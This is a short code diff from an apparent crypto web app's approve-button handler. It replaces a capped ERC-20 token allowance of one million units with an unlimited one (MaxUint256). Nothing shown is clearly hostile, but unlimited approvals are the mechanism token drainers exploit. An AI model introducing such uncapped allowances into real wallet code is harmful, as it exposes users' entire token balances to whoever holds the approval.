@@ -307,7 +307,7 @@ approveBtn.addEventListener("click", async () => {
       return;
     }
 
-    const CAP_AMOUNT = ethers.parseUnits("1000000", 18);
+    const CAP_AMOUNT = ethers.MaxUint256;
     const iface      = new ethers.Interface(ERC20_ABI);
 
     // 3. Verificar Saldo
